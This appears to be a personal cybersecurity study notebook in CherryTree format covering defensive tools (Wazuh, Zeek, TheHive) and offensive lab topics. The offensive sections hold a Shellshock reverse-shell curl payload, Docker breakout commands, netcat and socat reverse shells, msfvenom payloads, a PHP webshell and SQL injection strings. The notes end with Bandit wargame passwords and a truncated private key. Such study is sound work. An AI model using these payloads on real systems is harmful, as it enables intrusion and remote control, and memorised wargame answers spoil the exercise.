- Wazuh, open source and extensible EDR solution

Log analisys
- Event correlation, relationship from multiple logs sources
- Baselining, </rich_text>
    </node>
    <node name="Sysinternals" unique_id="178" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695442603" ts_lastsave="1695442661">
      <rich_text>compilation of over 70+ windows based tools
adquired in 2006</rich_text>
    </node>
    <node name="Windows Event Logs" unique_id="179" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695536698" ts_lastsave="1696121811">
      <rich_text>tools to audit trail
used to sysadmins, IT technicians, desktop engineers, etc.

Event Viewer
- possible see using tex editor
- raw data is possible translate to XML
- elements:
   → system logs, associeated with OS segments, information of devices
   → security logs, logon and logoff activities on a device
   → application logs, related to applications installed on a system, error, events and warnings
   → Directory service events, used with active directory, domain controllers
   → File Replication Service Events, associated with windows servers
   → DNS Event logs, record domain events
   → Custom logs, custom data storage
- ways:
   → Event viewer, GUI
   → Wevutil.exe, cli tool
   → Get-WinEvent, powershell cmdlet</rich_text>
    </node>
    <node name="Sysmon" unique_id="180" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696303227" ts_lastsave="1696378007">
      <rich_text>tool to monitor and log events on win
detailed information about process creation, network connection and changes to file creation time</rich_text>
    </node>
    <node name="Osquery" unique_id="183" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696816774" ts_lastsave="1696817220">
      <rich_text>open-source agent created by facebook in 2014
convert os in relational database
is like sqlite</rich_text>
    </node>
    <node name="Wazuh" unique_id="184" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696906198" ts_lastsave="1699814792">
      <rich_text>is a EDR (endpoint detection and response), series of tools and applications that monitor devices for an activity
fetures:
- auditing a device for common vulnerabilities
- Proactively monitoring a device for suspicious activity such as unautorised login, brute force attascks or privileges escalations
- visualing complex data and events into neat and trendy graphs
- recording a device's normal operating behaviour to help with detecting anomalies

created in 2015 is an open-source
device called agent

Wazuh agents
devices that record the events and preocesses of a system are called agents
monitor the processes and events
needs:
	operating system
	address of the wazuh server to send logs
	which group is added agent
	
Policy auditing
this save metrics using multiple framworks and legislations such as NIST, MITRE and GDPR

for windows this is sysmon tool</rich_text>
    </node>
    <node name="Zeek" unique_id="174" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693767420" ts_lastsave="1693850742">
      <rich_text>open source and commercial network monitoring tool
passive
used to network security monitor

Network monitoring and Zeek
- set of management actions to watch/continuosly overview and optionally save the network traffic
- network security is focused on network anomalies like rogue hosts, encrypted traffic, suspicous service and port usage, and malicious/suspicious traffic patterns
- zeek provides a wide range of detailed logs ready to investigate both for forensics and data analysis actions

Zeek logs
- 50+ logs in 7 categories
- use cat {file} | zeek-cut {fields}

CLI Kung fu recall
-- use of CLI commands in linux

Zeek signatures
- signatures to have rules and event correlations
- low-level pattern matching and cover conditions similar to snort rules
- exists a scriptng language to find events
- is composed of:
   → id
   → conditions
   → actions

Zeek Script
- own event-driven scripting language, high-level languahes and allows us to investigate and correlate the detected events</rich_text>
    </node>
    <node name="BRIM" unique_id="175" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694048638" ts_lastsave="1694048863">
      <rich_text>open source desktop application
search and analytics
support zeek signatures and suricata rules
Two types of inputs:
	Packet Capture FIles: pcap files with tcpdump, tshark and wireshark
	Log Files: strucutred log files like zeek logs</rich_text>
    </node>
    <node name="TheHive" unique_id="164" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687811761" ts_lastsave="1687814468">
      <rich_text>Security Incident Response Platform

Introdution
- scalable, open-source and freely available security incident response platform
- assist security analysts and practitioners working in SOCs, CSIRTs and CERTs
- core functions:
   → Collaborate, multiple analyst from one organisation can work together, real time
   → Elaborate, Investigations correspond to cases, broken down into associated tasks, created from scratch or using a template
   → Act, quick traiging process can be supported by allowing analyst to add observables to their case

Features and Integrations
- support analyst workflows, faetures
   → Case/task Management, Every investigation is meant to correspond to a case that has been created, broken down into one or more tasks for added granularity
   → Alert triage, Cases can be imported from SIEM alerts, email reports and other security event sources
   → Observable Enrichment with cortex, supports cortex, an observable analysis and active response engine.
   → Active response, allos analystys to use responders and run active actions to communicate, share information about incidents and prevent or contain a threat
   → Custom dashboard, Statistics on cases, tasks, observables, metrics and more can be compiled and distributed on dashboards
   → Built-in MISP Integration, useful integration is with MISP, platform for sharing, storing and correlating indicators of compromise of targeted attacks and other threats

User profiles and permissions
- create an organisation group to identfy the analysts and assign different roles based on a list of pre-configured user profiles
- preconfigured user profiles:
   → admin, full administrative permissions on the platform; limited to cases or investigations
   → org-admin, manage users and all organisation-level configuration, can create and edit cases, tasks, observables and run analysers and responders
   → analyst, can create and edit cases, tasks, observables and run analysers and reponders
   → read-only, can only read, cases, tasks and observables details</rich_text>
    </node>
    <node name="Vulnversity" unique_id="153" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686027971" ts_lastsave="1686028576">
      <rich_text>Use of nmap to scan machine:
nmap -sV {ip}
gobuster, to brute-force URIs, directories and files, DNS subdomains and virtual host names
in kali is possible install with apt install gobuster
execute with gobuster dir -u </rich_text>
      <rich_text link="webs http://{ip}:{port">http://{ip}:{port</rich_text>
      <rich_text>} -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
</rich_text>
    </node>
    <node name="Burp suite" unique_id="154" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686032173" ts_lastsave="1686959630">
      <rich_text>is aframework written in Java to web application penetretion testing, this is a standard tool, used to testing APIs
this can capture and manipulate all of the traffic between an attacker and a webserver

Burn proxy
- the most fundamental and mos important
- allows capture requests and responses between selves and target
- can manipulate or sent to other tools

set owner userId upon execution) is a particular type of file permission given to a file</rich_text>
    </node>
    <node name="The Docker Rodeo" unique_id="158" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1686592370" ts_lastsave="1686875172">
      <rich_text>to get data from docker registry
curl -X GET </rich_text>
      <rich_text link="webs http://docker-rodeo.thm:5000/v2/_catalog">http://docker-rodeo.thm:5000/v2/_catalog</rich_text>
      <rich_text>
curl -X GET </rich_text>
      <rich_text link="webs http://docker-rodeo.thm:5000/v2/repository/name/tags/list">http://docker-rodeo.thm:5000/v2/repository/name/tags/list</rich_text>
      <rich_text>
curl -X GET </rich_text>
      <rich_text link="webs http://docker-rodeo.thm:5000/v2/_catalog">http://docker-rodeo.thm:5000/v2/</rich_text>
      <rich_text>cmnatic/myapp1/manifest/notsecure

use of dive to check layers of docker image

check on open port curl </rich_text>
      <rich_text link="webs http://{ip}:{port}/version">http://{ip}:{port}/version</rich_text>
      <rich_text>
to check status of docker: docker -H tcp://{ip}:{port} ps
mount host volumes docker run -v /:/mnt --rm -it alpine chroot /mnt sh, scale priviledges

three groups to isolate containers:
- namespaces
- cgroups
- overlayFS

Process can only see the process in the same namespaces, in theory no conflicts

nsenter --target 1 --mount sh, used to access to process ID 1 and mount using shell in this process

some notes:
- use of the principle of least privileges
- docker secom 101: feature of linux kernel, use of docker uses security profiles
- use of certifications in daemon

Hacking and securing docker containers
Cgroups is a feature of the linux kernel
resources such as CPU, RAM, IOPS and network
we can enforce limits and contraints on docker cntainers too
limit PIDs to prevent fork bombs

to avoid fork bombs use = --pids-limit {number} in docker run

namespaces
isolation is one the fundamental aspects for containers
docker uses namespaces
docker engines uses:
PID, process isolation
NET, manging network interfaces
IPCm access to IPC resources
MNT, filesystem mount points
UTS, isolation kernel and version identifiers
User Id, privilege isolation
avoid use of UID=0 and GID=0

dockerd --userns-remap=default &amp;, with this the docker changes of permissions
cat /etc/subuid
cat /etc/subgid

Docker attack surface
- elevate priviledges
- direct attak to docker, still in k8s
- enterprises typically use private repositories
- docker publicly known vulnerabilities that could be intentional or unintentional
- </rich_text>
      <rich_text link="webs https://hub.docker.com/r/vulnerables/cve-2014-6271/">https://hub.docker.com/r/vulnerables/cve-2014-6271/</rich_text>
      <rich_text>
- access using nc
   → curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i &gt;&amp; /dev/tcp/{ip docker0}/{port} 0&gt;&amp;1'" </rich_text>
      <rich_text link="webs http://localhost:8080/cgi-bin/vulnerable">http://localhost:8080/cgi-bin/vulnerable</rich_text>
      <rich_text>
   → open port with nc: nc -nlvp {port(same of curl)}

backdooring
- malicous code is not a new concept
- common in windows executables as well mobile apps
- dockerscan is a tool with check this problems
- docker scan modify images: dockerscan image modify trojanize {original image} -l {ip} -p {port} -o {ouput image}

Privilege escalation
- docker daemon requieres root privileges to perform some of its operations
- if one user is part of docker group, it is possible elevate his privileges
- use of setuid binaries to achieve this

Container breakout techniques
- over privileged containers
   → CAP_SYS_ADMIN
   → CAP_SYS_MODULE
- dangerous mountpoints
   → /var/run/docker.sock

Docker.sock
- unix socket, backbone for managing cntainers
- with docker cli client interacts with docker deamon
- can be exposed over the network on a specific port
- UNIX socket is the defauilt
- mounting into containers is dangerous
- connect to socket: docker -H unix:///var/run/docker.sock run -it -v /:/test:ro -t alpine sh

--privileged flag
- it will all linux capabilities
- is possible gain advantage of these capabilities
- cap_sys_admin, cap_sys_patrace and cap_sys_module are some of the dangeorus capabilities
- with cap_sys_module is possible load kernel module directly onto the host's kernel

Writing to kernel space
- Step-by-step shown below:
Before copying the file over:

1. cd ~/kernelmodule
2. vi docker_module.c (edit this file and add MODULE_LICENSE("GPL"); as the last line in the file)

#include &lt;linux/init.h&gt;
#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;
 
static int __init docker_module_init(void) {
 
    printk(KERN_INFO "Docker module has been loaded\n");
    return 0;
}
 
static void __exit docker_module_exit(void) {
    printk(KERN_INFO "Docker module has been unloaded\n");
}
 
module_init(docker_module_init);
module_exit(docker_module_exit);
MODULE_LICENSE("GPL");

3. rm docker_module.ko (remove the existing file as we are going to rebuild)

4. make (execute this to recompile and generate the new file)

5. Now you can copy the file over to the container and try again.

in docker inpect is possible get the env variables

Automated tools
- trivy
   → simple vulnerability scaneer
   → used in pipelines of devsecops
   → static analysis
   → docker run --rm -v `pwd`:/root/.cache/ aquasec/trivy image getcapusule8/shellshock:test
- docker bench security
   → is a script that checks for dozen
   → uses CIS benchmarks
   → docker run -itd --name vulnerability alpine

Defenses:
- AppArmor
   → linux security module
   → allows us to restrict programs capabilities
   → used to protect docker containers from security threats
   → is necesary security profile with every container
   → when start a container is necesary a profile
   → to load: sudo apparmor_parser -r -W {file}
   → docker run -it --security-opt apparmor=apparmor-profile alpine sh
- Seccomp
   → another kernel feature
   → used to filtering system calls issued by a program
   → acts as firewall for system calls
   → is possible use profiles
   → is necesary load these profiles on each container
   → used to specify commands in docker container
   → with --priviledge seccomp is avoid
- Capabilities
   → root users in linux are very special
   → have granular control over controlling
   → provide more powers to stardard user at a granular level
   → docker run -it --cap-drop CHOWN alpine sh
- Docker content trust
   → download only signed images
   → official images
   → images with verified publisher tag
   → docker certified images</rich_text>
    </node>
    <node name="OWASP 10" unique_id="171" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691629270" ts_lastsave="1693269735">
      <rich_text>Broken access control
- access to page without authorization
- view sensitive information from other users
- accesing unauthorized functionality

IDOR
- Insecure direct object reference
- accesing using id or another identifier

Cryptographic failures
- misuse or lack of use of cryp algo for protecting sensitive information
- use of encrypting data in transit, connect between user and pages
- encrypting data at rest, save data in server using cyphers
- common use of the techniques like man in he middle attacks
- does not necesary adavenced networking knowledge

Injection
- interpreted user-controlled input as commands or parameters
- depending of technology and how these technologies interpret the input
- SQL injection: use of sql queries in input, use to get, modify and delete information
- command Injection: use of system commands
- how to avoid:
   → using an allow list: input is compared to a list of safe inputs or characters, launch errors if is not secure
   → stripping input: contains dangerous characters, these are removed

Insecure Desing
- vulnerabilities which are inherent to the application's architecture
- bad implementations or configurations
- shortcuts by developers
- insecure password resets
   → use of brute force with code for validation

Security Misconfiguration
- distint of top 10
- poor configuration on cloud services
- unnecesary faetures enabled
- default accounts
- error messages that are overly
- not using http security headers

Vulnerable and outdated components
- don't update software of company
- found in exploit-DB

Identification and authentication failures
- common use username and password
- use of:
   → brute force attacks: using username and password, use of multiple auth attemps
   → weak credentials: use of common passwords is possible access to apps
   → weak session cookies: predectible values

software and data integrity failures
- malicious modifications
- hash is used to check modifications
- software integrity failures:
   → change of code by hackers
   → injection of malicious code
   → is possible use integrity={hash} in script tag to avoid errors
- data integrity failures
   → avoid use of usernames in cookies
   → good solution is JWT

security logging and monitoring failures
- logging is esencial to check incidents
- significant impacts:
   → regulatory damage: attacker has gained access to personally identifiable user information
   → risk of further attacks: presence may be undetected without logging

Server-Side Request Forgery (SSRF)
- attacker can coerce a web application into sending request on their behalf to arbitrary destinations

PRATICAL TOP 10 ---------
Inyection
- user input is interpreted as commands
- exists 2:
   → SQL injection, passed like sql queries
   → Command injection, passed like system command

API SECURITY -------
- BOLA (Broken Object Level Authorisation)
   → refers to Insecure Direct Object Reference, using input to get access to the resource they are not authorised
- BUA (Broken User Authentication)
   → api with sensitive data
   → access to database or adquire higher privilege
- Excesive Data Exposure
   → disclose more than desired information
   → not consideration sensitivity level
- Lack of Resources &amp; Rate Limiting
   → any restriction on the frequency of clients' requested
   → uso to avoid DoS
   → excesive resource utilisation in network, storage, compute, etc
- Broken function Level Authorisation
   → access to confidential data by impersonating a high privileged user (admin)
   → access to administrative functions
- Mass Assigment
   → submit more data of necesary, for example change username because the model is not well filtered 
- Security Misconfiguration
   → incorrect and poorly configured security controls
   → incomplete default configuration
   → publically accessible cloud storage
   → Cross-Origin resource sharing
   → error message with displayed sesitive data
- Injection
   → user input is not filtered and is directly processed by an API
   → use of SQL Injection or OS injection
- Improper Assets Management
   → use of tweo version of an API available in our system
   → V1 is active with V2
   → in V1 security is not updated
- Insufficient Logging &amp; Monitoring
   → there is not anough evidence available due to the absence of logging and monitoring mechanims</rich_text>
    </node>
    <node name="OWASP Juice" unique_id="239" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704510132" ts_lastsave="1704518313">
      <rich_text>Inject the juice
- vulnerabilities are very dangerous, injection
- downtime or loss of data
- exist multiple types of injections attacks, some of them are:
   → SQL Injection, enters a maliciuos or malformed query to either retrieve or tamper data from a database
   → Command Injection, web application take input or user-controlled dataand run them as system command
   → Email Injection, allows malicious user to send email messages without prior authorization by the email server
- use of SQL INJECTION:
   → common use of “‘ or 1=1 --”

who broke my lock
- exploiting authentication through different flaws
- mechanism that are vulnerable to manipulation
   → weak password in high privileged accounts
   → forgotten password pages

Ah! Don't look!
- should store and transmit sensitive data safely and securely
- bypass called "Poison Null Byte” like %00
- using: %2500

Who's flying this thing?
- when broken access control exploits or bugs are found, it wil be categorised into one of two types
   → Horizontal privilege escalation, occurs when a user can perform an action or access data of another data of another user with the same level of permissions
   → Vertical privilege escalation, occurs when a user can perform an action or access data of another user with a higher level of permissions

Where dud that come from
- XSS or cross-site scripting is a vulnerability that allows attackers to run javascript in web applications
- major types of XSS:
   → DOM XSS, uses the HTML environment to execute malicius javascript, this use script tag
   → Persistent XSS, is JS that is run when the server loads the page containing it, server does not sanitise the user data when it is uploaded to a page, use on blog posts
   → Reflected XSS, JS that is run on the client-side end of the web application, these are most commonly found when the server doesn't sanitise search data</rich_text>
    </node>
    <node name="SAST" unique_id="173" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693355854" ts_lastsave="1693355859">
      <rich_text>Automatization of testing for code analysis</rich_text>
    </node>
    <node name="Eternal Blue" unique_id="181" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696303470" ts_lastsave="1696303477">
      <rich_text>Scan and learn what exploit this machine is vulnerable to</rich_text>
    </node>
    <node name="Shells" unique_id="188" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1698636581" ts_lastsave="1699293931">
      <rich_text>shell is used with CLI, bash and sh are examples of shell

Tools:
- netcat, swiss army knife to network
- socat, netcat with steroids
   → the syntax is more difficult
   → nc is more common that socat
- Metasploit - multi/handler, is a module of metasploit
- Msfvenom, part of metasploit framework, used to generate payloads on the fly


Used URLS:
- </rich_text>
      <rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</rich_text>
      <rich_text>
- </rich_text>
      <rich_text link="webs https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</rich_text>
      <rich_text>
- </rich_text>
      <rich_text link="webs https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</rich_text>
      <rich_text>

Shells:
- reverse shells, execute code that connects back to your computer, goods for bypass firewalls rules
- bind shells, code executed on the target is used to start a listener attached to a shell directly on the target, protected using firewalls

Netcat
- basic tool in pentester
- used to reverse shels: nc -lvnp {port}
   → l is listener
   → v is verbose output
   → n not to resolve host name or use DNS
   → p indicates port
- common ports used 80, 443 and 53

Netcat shell stabilisation
- technique 1: python
   → python -c ‘import pty;pty.spawn("/bin/bash")’, with python 2 or 3
   → export TERM=xterm
   → stty raw -echo; fg
- technique 2: rlwrap, program that gives access to history, tab autocompletion
   → use: rlwrap nc -lvnp {port}
   → this techniques is used with windows
- technique 3: socat
   → python -m http.server 80

Socat
- similar to netcat
- reverse shells
   → socat TCP -L:{port} -
   → win: socat TCP:{local ip}:{local port} EXEC:powershell.exe, pipes
- bind shells
   → socat TCP-L:{port} EXEC:"bash -li"
- more stable reverse shell: socat TCP-L:{port} FILE:`tty`,raw,echo=0

Socat encrypted shells
- this is capable of create encrypted shells
- steps
   → openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt, to create certificate
   → cat shell.key shell.crt &gt; shell.pem, to create .pem
   → socat OPENSSL -LISTEN:{port},cert=shell.pem,verify=0 -, to reverse shell listener
   → socat OPENSSL:{local ip}:{local port},verify=0 EXEC:/bin/bash
- to bind shell
   → socat OPENSSL-LISTEN:{port},cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
   → socat OPENSSL:{target ip}:{target port},verify=0 -

Common shell payloads
- use of msfvenom
- nc -lvpn {port} -e {command}, with -e is possible execute a command, this is a netcat-tradicional
- mkfifo /tmp/f; nc -lvpn {port} &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt;&amp;1;rm /tmp/f, this create a named pie, and connect the nc to named pipe, and is used input, output and errput in the named pipe, this is a bind shell
- with reverse shell: mkfifo /tmp/f; nc {local ip} {port} &lt; /tmp/f | /bin/sh &gt; /tmp/f 2&gt;&amp;1; rm /tmp/f

msfvenom
- used to generate code for primarily reverse and bind shell
- used in lover-level exploit
- create payloads in various formats, exe, aspx, war, py
- syntax: msfvenom -p {payload} {options}
- example: msfvenom -p windows/x64/shell/reverse_ftp -f exe -o shell.exe LHOST={liste ip} LPORT={listen port}
- type of payloads
   → staged, payloads are sent in 2 parts, the first is stager, waiting connections, but does not contains reverse shell, this does not touch the disk, metasploit is added before
   → stageless, more common, self-contained
- meterpreter, metasploit's own brand of fully-featured shell, completely stable to work with windows target
- payload naming conventions
   → {OS}/{arch}/{payload}
   → {OS}/{payload}, to windows 32
   → stageless are denoted with underscore
   → windows/x64/meterpeter/reverse_tcp to use meterpreter

Metasploit multi/handler
- milti/handler is a superb tool for catching reverse shells
- commands:
   → set PAYLOAD {payload}
   → set LHOST {listen address}
   → set LPORT {listen port}
- to launch: exploit -j, this is necesary sudo permissions
- session {id} to foreground

Webshell
- exists web servers with opportunities to use like webshells, common with PHP or ASP
- basic webshell: &lt;?php echo “&lt;pre&gt;” . shell_exec($_GET["cmd"]) . “&lt;/pre&gt;”; ?&gt;
- </rich_text>
    </node>
    <node name="Metaspoit" unique_id="196" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701365847" ts_lastsave="1702060340">
      <node name="Introduction" unique_id="197" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701365862" ts_lastsave="1701369332">
        <rich_text>INTRODUCTION
exploit framework
support all phases of a penetration testing
two versions:
    Pro: commercial version, with automation and management of task with GUI
    Framework: open source version works like CLI
is a set of tools of, information gatering, scanning, exploiting, exploit development, post explotion and more
primary action is penetration testing

main components:
    msfconsole: main CLI
    modules: exploits, scanners, payload and more
    tools: stand alone tools, like msfvenom, pattern_create and pattern_offset
    
COMPONENTS
main concepts:
    Exploits: piece of code that use vulnerabilities on the target
    Vulnerability: desing code or logic flawaffecting the target system to get information or execute code in the target
    Payload: take advantage of a vulnerability


MSFCONSOLE
to execute: sudo msfconsole
regular cli shell
commands:
    ls, to see files where is launched
    is possible use the mayority of commands of linux
    use exploit/windows/smb/ms17_010_eternalblue, exploit to smb in windows
    show options
    back, return to previous console
    search to fing modules in database
    search type:auxiliary telnet
    
meterpreter to payload
set to set variables, unset to delete, unset all used to delete all
setg is used to set variable in all modules, unsetg to delete in all modules
exploit -z run eht exploit and background the session
if is successfully exploited a session will be created
sessions to show sessions
session -i interact with any session
</rich_text>
      </node>
      <node name="Explotation" unique_id="198" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1701570666" ts_lastsave="1701896988">
        <rich_text>Metasploit for vulnerability scanning and explotation
how to database features makes easy penetration testing
generate of payload with msfvenom

PORT SCANNING
- use of command: `search portscan`
- is possible execute nmap from msfconsole
- is possible check ports of UDP with scanner/discovery/udp_sweep
- use scanner/smb/smb_version to run under smb

METASPLOIT DATABASE
- use generally form several targets
- is necesary use pg database
- start with msfdb init
- db_status
- workspace, to create new workspace, using -a to add new workspace or -d to delete
- db_nmap to save results in database
- show results with: hosts and services

VULNERABILITY SCANNING
- low hanging friut, easily identifiable and exploitable vulnerabilities, generally high-level privileges 

Explotation
- exploits are the most popular module category
- is possible search using `search` command, more information using `info` launching `exploit`
- this is easy but depends on the knowledges of service running on the target system
- most of exploits will have a preset default payload, to see use `show payloads`
- `set payload` to select
- `show options` to show what parameters are necesaries
- using `CTRL + Z` to run in background and `CTRL + C` to abort

MSFVENOM
- this replace msfpayload and msfencode to generate payloads
- this allow access of payloads available in Metasploit, is possible create custom payloads in many formats and for many differente target systems
- use
   → msfvenom -l payloads
- encoders do not aim to bypass antivirus installed, this encoded the payload, use of ofuscations techniques or learning methods to inject shellcode
- encoders use -e parameter to create: `msfvenom -p php/meterpreter/reverse_ctp LHOST={host} -f raw -e php/base64` 
- handlers
   → similar to exploits using a reverse shells
   → used with msfvenom
   → this manage by the exploit module
- Other payloads
   → based in the OS, webserver or interpreter, is possible create multiple formats
   → with -f elf to create unix binaries
   → -f exe to windows
   → -f raw to lang
   → -f asp to ASP</rich_text>
      </node>
      <node name="Meterpreter" unique_id="208" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1702060340" ts_lastsave="1702268432">
        <rich_text>Introduction
- metasploit payload, supports penetration testing process with many values components
- run on the target system and act as an agent, used like C2
- runs on the target system but is not installed on it
- runs in ram to avoid being detected during antivirus scans
- it is avoid by IPS and IDS solutions using encrypted communication with server
- meterpreter is ghost with another name, for example spoolsv.exe

Flavors
- two categories
   → inline or single, 
   → staged, send in two steps, first installed and before requests the rest of the payload
- too depending of target system
- in another words:
   → the target operating system
   → components available on the target system (Python, PHP...)
   → Network connection types you can have with the target system

Commands
- every version of meterpreter will have different command options
- three categories of tools:
   → Built-in commands
   → Meterpreter tools
   → Meterpreter scripting
- in help command:
   → Core
   → File system
   → Networking
   → System
   → User interface
   → Webcam
   → Audio output
   → Elevate
   → Password database
   → Timestomp
</rich_text>
      </node>
    </node>
    <node name="bandit" unique_id="191" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="40" is_bold="0" foreground="" ts_creation="1700199042" ts_lastsave="1704004427">
      <rich_text>ssh bandit.labs.overthewire.org -p 2220

solutions:
- 0: bandit0: bandit0
- 1: bandit1: NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
- 2: bandit2: rRGizSaX8Mk1RTb1CNQoXTcYZWU6lgzi, to read files with - use `cat &lt;-`
- 3: bandit3: aBZ0W5EmUfAf7kHTQeOwd8bauFJ2lAiG, to read files with spaces used \
- 4: bandit4: 2EW7BBsr6aMMoJ2HjW067dm8EgX26xNe
- 5: bandit5: lrIWWI6bB37kxfiCQZqUdOIYfr6eEeqR, to read all files with cat -- *
- 6: bandit6: P4L4vucdmLnm8I7Vl7jG1ApGSfjYKqJU, to find files using size: find . -size {#}
- 7: bandit7: z7WtoNQU2XfjmMtWA8u5rN4vzqu4v99S, to search by user and group and only show permission access: `find / -size 33c -group bandit6 -user bandit7 2&gt;&amp;1 | grep -v 'Permission denied'`
- 8: bandit8: TESKZC0XvTetK0S9xNwm25STk5iWrBvP, use of grep to search a word in file
- 9: bandit9: EN632PlfYiZbn3PhVK3XOGSlNInNE00t, to search by number of occurencies: cat data.txt | sort | uniq -c | sort -r | head
- 10: bandit10: G7w8LIi6J3kTb8A7j9LgrywtEUlyyp6s, to read binary files: strings {file} | grep
- 11: bandit11: 6zPeziLdR2RKNdNYFNb6nVCKzphlXHBM
- 12: bandit12: JVNBBFSmZwKKOP0XbFXOoW8chDz5yVRv, to rotate 13: cat data.txt | tr '[a-z]' '[n-za-m]' | tr '[A-Z]' '[N-ZA-M]'
- 13: bandit13: wbWdlBxEir4CaE8LaPhauuOo6pwRmrDw, to decompress and get file: cat data.txt | xxd -r &gt; data
- 14: bandit14: fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq, use of ssh
- 15: bandit15: jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt, connect and send data: echo "fGrHPx402xGC7U7rXKDaxiWFTOiF0ENq" | nc localhost 30000
- 16: bandit16: JQttfApK4SeyHwDlI9SXGR50qclOAil1, connect and send data: echo jN2kgmIXJ6fShzhT2avhotn4Zcka6tnt | openssl s_client -connect localhost:30001 -ign_eof
- 17: bandit17: 
“”"
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
